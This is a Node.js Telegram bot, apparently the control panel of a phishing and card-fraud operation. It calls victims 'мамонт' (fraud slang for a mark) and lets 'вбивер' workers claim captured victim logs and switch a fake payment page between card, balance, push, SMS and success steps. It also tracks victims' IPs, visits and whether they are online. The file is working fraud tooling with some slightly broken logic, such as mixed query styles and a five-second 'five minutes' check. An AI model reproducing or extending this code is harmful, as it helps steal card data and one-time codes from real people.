const stage = require("./handlers/scenes");
const {
    connectMongoDB,
    Users,
    Visits,
    Carts,
    Checkouts,
    Logs
} = require("./config/mongodb");
const config = require("./config/config");
const logsGroupId = config.bot.logsGroupId;
const vbivButtons = require("./handlers/functions/vbivButtons");
const withOutWriter = require("./handlers/functions/withOutWriter");
const withWriter = require("./handlers/functions/withWriter");
const writerMessage = require("./handlers/functions/writerMessage");

const { Telegraf, session } = require("telegraf"),
    bot = new Telegraf(config.bot.token);

// Обработка ошибок Telegram
bot.catch((err, ctx) => {
    console.error('Telegram bot error:', err);
    if (ctx && ctx.reply) {
        ctx.reply('Произошла ошибка. Попробуйте позже.').catch(console.error);
    }
});

bot.use(session());
bot.use(stage.middleware());

// Команда /stats для статистики за 24 часа
bot.command('stats', async (ctx) => {
  try {
    const twentyFourHoursAgo = new Date();
    twentyFourHoursAgo.setHours(twentyFourHoursAgo.getHours() - 24);

    // Получаем статистику
    const totalVisitors = await Users.countDocuments({
      firstVisit: { $gte: twentyFourHoursAgo }
    });

    const totalVisits = await Visits.countDocuments({
      timestamp: { $gte: twentyFourHoursAgo }
    });

    const checkoutAttempts = await Checkouts.countDocuments({
      createdAt: { $gte: twentyFourHoursAgo }
    });

    const uniqueVisitors = await Users.countDocuments({
      lastVisit: { $gte: twentyFourHoursAgo }
    });

    // Получаем топ страниц
    const topPages = await Visits.aggregate([
      { $match: { timestamp: { $gte: twentyFourHoursAgo } } },
      { $group: { _id: '$page', count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 5 }
    ]);

    const statsMessage = `
📊 <b>СТАТИСТИКА ЗА 24 ЧАСА</b>

👥 <b>Общие показатели:</b>
└ Новые посетители: <b>${totalVisitors}</b>
└ Уникальные посетители: <b>${uniqueVisitors}</b>
└ Всего посещений: <b>${totalVisits}</b>
└ Переходы на оплату: <b>${checkoutAttempts}</b>

📈 <b>Конверсия:</b>
└ Посещения → Оплата: <b>${totalVisits > 0 ? ((checkoutAttempts / totalVisits) * 100).toFixed(2) : 0}%</b>

🔥 <b>Топ страниц:</b>
${topPages.map((page, index) => 
  `${index + 1}. ${page._id}: <b>${page.count}</b>`
).join('\n')}

⏰ <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}
    `;

    await ctx.reply(statsMessage, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Stats command error:', error);
    await ctx.reply('❌ Ошибка получения статистики');
  }
});


bot.action(/^customError_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter('customError', {
        logId: ctx.match[1]
    }).catch((err) => {
        console.error("Error entering customError scene:", err);
    });
});


bot.action(/^custom_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^customscreen_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom_screen`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^log_(\d+)_setStatus_(change|screen|skip|card|balance|push|sms|success|custom|customError)$/, async (ctx) => {
    try {
    const logId = ctx.match[1];
    const newStatus = ctx.match[2];
    const log = await Logs.findOne({
        where: {
            id: logId,
        }
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    if (ctx.from.id !== log.writerId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx.answerCbQuery("⚠️ Это не твой лог!", true);
    }

    if (newStatus == 'customError' || newStatus == 'custom' || newStatus == 'screen') {
        await ctx.answerCbQuery("✅ Статус успешно изменен!");
        await ctx.deleteMessage().catch((err) => err);
    }

    await log.update({
        status: newStatus,
    });

    return ctx.telegram.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId,
        await vbivButtons(log)
    ).catch((err) => err);
    } catch (error) {
        console.log(error);
    }
});


bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

        await log.update({
            writerId: null,
        });


        await ctx.telegram.editMessageReplyMarkup(logsGroupId,
            log.messageId,
            log.messageId,
            await withOutWriter(log)
        );

        await ctx.deleteMessage().catch((err) => err);
        await ctx.telegram.sendMessage(
            logsGroupId,
            `⚠️ Вбивер <b>@${ctx.from.username}</b> отказался от лога!`,
            {
                parse_mode: "HTML",
                reply_to_message_id: log.messageId,
            }
        );
    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// взятие лога
bot.action(/^log_take_(\d+)$/, async (ctx) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

        if (log.writerId) return ctx.answerCbQuery("⚠️ Лог уже взят", true);

        await log.update({
            writerId: ctx.from.id,
        });
        await ctx
            .editMessageReplyMarkup(
                await withWriter(log, ctx.from)
            )
            .catch((err) => err);


        const msg = await ctx.telegram
            .sendMessage(ctx.from.id, await writerMessage(log), {
                parse_mode: "HTML",
                reply_markup: await vbivButtons(log),
            }).catch((err) => err);


        await log.update({
            writerMsgId: msg.message_id,
        });

    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

bot.action(/^eye_(.+)$/, async(ctx) => {
    try {
        const victim = await Logs.findOne({
            where: {
                id: ctx.match[1],
            },
        });

        if (!victim) {
            return ctx.answerCbQuery('Мамонт не найден');
        }

        const message = victim.online ? '✅ Мамонт на странице!' : `🛑 Мамонт не на сайте!`;
        await ctx.answerCbQuery(message);
        const fiveMinutesAgo = new Date();
        fiveMinutesAgo.setSeconds(fiveMinutesAgo.getSeconds() - 5);

        if (victim.online && victim.updatedAt < fiveMinutesAgo) {
            await victim.update({ online: false });
        }

    } catch (err) {
        console.log(err)
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// Обработчики для новых функций отслеживания
bot.action(/^track_user_(.+)$/, async (ctx) => {
    try {
        const userId = ctx.match[1];
        
        // Получаем информацию о пользователе
        const user = await Users.findOne({ userId });
        
        if (!user) {
            return ctx.answerCbQuery('Пользователь не найден');
        }

        const userInfo = `
👤 <b>ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ</b>

🆔 <b>ID:</b> <code>${user.userId}</code>
📍 <b>IP:</b> <code>${user.ip}</code>
🔢 <b>Посещений:</b> <b>${user.visitCount}</b>
📅 <b>Первый визит:</b> ${user.firstVisit.toLocaleString('ru-RU')}
📅 <b>Последний визит:</b> ${user.lastVisit.toLocaleString('ru-RU')}
🔗 <b>Referrer:</b> ${user.referrer || 'Прямой переход'}
        `;

        await ctx.reply(userInfo, { parse_mode: 'HTML' });
        await ctx.answerCbQuery('✅ Информация отправлена');
    } catch (error) {
        console.error('Track user error:', error);
        await ctx.answerCbQuery('❌ Ошибка получения информации');
    }
});

bot.action(/^checkout_(.+)_(success|cancel)$/, async (ctx) => {
    try {
        const checkoutId = ctx.match[1];
        const status = ctx.match[2];
        
        // Обновляем статус checkout
        await Checkouts.findByIdAndUpdate(checkoutId, {
            status: status === 'success' ? 'completed' : 'failed'
        });

        const statusText = status === 'success' ? '✅ Заказ успешно оформлен' : '❌ Заказ отменен';
        await ctx.answerCbQuery(statusText);
        
        // Обновляем сообщение
        const newText = ctx.callbackQuery.message.text + `\n\n${statusText}`;
        await ctx.editMessageText(newText, { 
            parse_mode: 'HTML',
            reply_markup: ctx.callbackQuery.message.reply_markup
        });
    } catch (error) {
        console.error('Checkout status update error:', error);
        await ctx.answerCbQuery('❌ Ошибка обновления статуса');
    }
});

bot.action('user_stats', async (ctx) => {
    try {
        // Вызываем команду stats
        await ctx.scene.leave();
        await ctx.reply('📊 Получение статистики...');
        
        // Имитируем команду /stats
        const twentyFourHoursAgo = new Date();
        twentyFourHoursAgo.setHours(twentyFourHoursAgo.getHours() - 24);

        const totalVisitors = await Users.countDocuments({
            firstVisit: { $gte: twentyFourHoursAgo }
        });

        const uniqueVisitors = await Users.countDocuments({
            lastVisit: { $gte: twentyFourHoursAgo }
        });

        const checkoutAttempts = await Checkouts.countDocuments({
            createdAt: { $gte: twentyFourHoursAgo }
        });

        const statsMessage = `
📊 <b>СТАТИСТИКА ПОЛЬЗОВАТЕЛЕЙ</b>

👥 <b>За 24 часа:</b>
└ Новые пользователи: <b>${totalVisitors}</b>
└ Активные пользователи: <b>${uniqueVisitors}</b>
└ Переходы на оплату: <b>${checkoutAttempts}</b>

⏰ <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}
        `;

        await ctx.reply(statsMessage, { parse_mode: 'HTML' });
        await ctx.answerCbQuery('✅ Статистика отправлена');
    } catch (error) {
        console.error('User stats error:', error);
        await ctx.answerCbQuery('❌ Ошибка получения статистики');
    }
});

// Безопасный запуск бота
async function startBot() {
    try {
        // Подключаемся к MongoDB
        const mongoConnected = await connectMongoDB();
        if (!mongoConnected) {
            console.error('❌ Не удалось подключиться к MongoDB');
            return;
        }

        await bot.launch();
        console.log('🤖 Bot Started with MongoDB!');
    } catch (error) {
        console.error('❌ Ошибка запуска бота:', error);
        // Не останавливаем приложение, продолжаем работу без бота
    }
}

startBot();

bot.catch((err) => {
    console.log(`Критическая ошибка при работе бота: ${err}`)
})